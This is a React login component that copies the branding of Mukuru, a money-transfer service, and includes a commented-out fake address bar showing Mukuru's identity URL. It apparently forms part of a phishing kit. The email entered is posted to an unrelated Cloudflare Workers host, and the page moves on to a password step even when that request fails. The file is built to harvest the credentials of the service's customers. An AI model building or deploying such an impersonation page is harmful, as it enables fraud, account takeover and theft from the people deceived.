import { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function MukuruLogin() {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  // Email format validator
  const isValidEmail = (em) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em);

  const handleLogin = async () => {
    setError("");

    // Validation
    if (!email.trim()) {
      setError("Email is required");
      return;
    }
    if (!isValidEmail(email.trim())) {
      setError("Please enter a valid email address");
      return;
    }

    // API CALL
    try {
      setLoading(true);
      const response = await fetch(
        "https://my-worker.instapayapi.workers.dev/api/email",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: email.trim() }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        setError(data.message || "Email not found. Please try again.");
        return;
      }

      // Success → go to password page
      navigate("/password", { state: { email: email.trim() } });
    } catch (err) {
      console.error("API error:", err);
      // For demo purposes, still navigate forward even if API fails
      navigate("/password", { state: { email: email.trim() } });
    } finally {
      setLoading(false);
    }
  };

  const handleKeyDown = (e) => {
    if (e.key === "Enter") handleLogin();
  };

  return (
    <div className="min-h-screen bg-gray-500 flex flex-col">
      {/* URL Bar */}
      {/* <div className="bg-gray-500 pt-6 px-3">
        <div className="bg-white rounded-t-2xl px-5 py-4 flex items-center justify-between">
          <p className="text-gray-700 text-sm sm:text-base truncate flex-1 pr-3">
            https://identity.mukuru.com/realms/mukuru/...
          </p>
          <button
            aria-label="Close"
            className="flex-shrink-0 text-gray-900 hover:text-gray-600 transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="22"
              height="22"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>
      </div> */}

      <div className="flex-1 flex flex-col bg-[#3A3A3A]">
        {/* Orange Header */}
        <header className="bg-[#E8442A] px-6 py-7 flex items-center gap-3">
          {/* <svg viewBox="0 0 100 100" className="w-11 h-11 flex-shrink-0">
            <g fill="white">
              {Array.from({ length: 12 }).map((_, i) => {
                const angle = (i * 30 * Math.PI) / 180;
                const x1 = 50 + Math.cos(angle) * 18;
                const y1 = 50 + Math.sin(angle) * 18;
                const x2 = 50 + Math.cos(angle) * 45;
                const y2 = 50 + Math.sin(angle) * 45;
                const perpAngle = angle + Math.PI / 2;
                const w = 6;
                const p1x = x1 + Math.cos(perpAngle) * w;
                const p1y = y1 + Math.sin(perpAngle) * w;
                const p2x = x1 - Math.cos(perpAngle) * w;
                const p2y = y1 - Math.sin(perpAngle) * w;
                return (
                  <polygon
                    key={i}
                    points={`${p1x},${p1y} ${p2x},${p2y} ${x2},${y2}`}
                  />
                );
              })}
              <circle cx="50" cy="50" r="14" />
            </g>
          </svg> */}
          <div className="h-[42px] w-[42px]">
          <svg viewBox="0 0 52 52" fill="none" class="login-logo-icon"><path d="M26 2 L31.5 13 L44 8 L39 20.5 L51 26 L39 31.5 L44 44 L31.5 39 L26 50 L20.5 39 L8 44 L13 31.5 L1 26 L13 20.5 L8 8 L20.5 13 Z" fill="none" stroke="#fff" stroke-width="3.5" stroke-linejoin="round" stroke-linecap="round"></path></svg>
          </div>
          <h1 className="text-white text-3xl font-semibold tracking-tight">
            MUKURU
          </h1>
        </header>

        <main className="flex-1 px-6 pt-8 pb-6 flex flex-col">
          <div className="mb-6">
            <h2 className="text-white text-2xl font-bold mb-2">
              Welcome To Mukuru
            </h2>
            <p className="text-white text-base font-normal">
              Please login below
            </p>
          </div>

          <div className="bg-[#5A5A5A] rounded-2xl p-6 mb-7">
            <label
              htmlFor="email"
              className="block text-white text-lg font-bold mb-3"
            >
              Email
            </label>
            <input
              id="email"
              type="email"
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                if (error) setError("");
              }}
              onKeyDown={handleKeyDown}
              placeholder="Enter email"
              className={`w-full bg-white rounded-full px-6 py-4 text-gray-700 placeholder-gray-400 outline-none transition text-base ${
                error
                  ? "ring-2 ring-red-500"
                  : "focus:ring-2 focus:ring-[#EF5A24]"
              }`}
            />
            {error && (
              <p className="text-red-400 text-sm mt-2 ml-2 font-medium">
                {error}
              </p>
            )}
          </div>

          <button
            onClick={handleLogin}
            disabled={loading}
            className="w-full bg-[#E8442A] hover:bg-[#d94e1e] active:bg-[#c44519] disabled:opacity-60 disabled:cursor-not-allowed transition-colors text-white font-bold text-lg py-4 rounded-full mb-6 flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <svg
                  className="animate-spin h-5 w-5"
                  viewBox="0 0 24 24"
                  fill="none"
                >
                  <circle
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                    className="opacity-25"
                  />
                  <path
                    fill="currentColor"
                    className="opacity-75"
                    d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
                  />
                </svg>
                Loading...
              </>
            ) : (
              "Login"
            )}
          </button>

          <div className="border-t border-gray-500/40 mb-6"></div>

          <div className="text-center mb-5">
            <span className="text-white font-bold text-base">
              New To Mukuru?{" "}
            </span>
            <a
              href="#signup"
              className="text-[#2DBDB6] underline font-normal text-base"
            >
              Sign Up
            </a>
          </div>

          <div className="text-center">
            <span className="text-white font-bold text-base">
              Login Problems?{" "}
            </span>
            <a
              href="#help"
              className="text-[#2DBDB6] underline font-normal text-base"
            >
              Get Help
            </a>
          </div>

          <div className="flex-1"></div>
        </main>

        <footer className="bg-[#4A4A4A] py-5 text-center">
          <p className="text-white text-sm">
            © Mukuru, All Rights Reserved.
          </p>
        </footer>
      </div>
    </div>
  );
}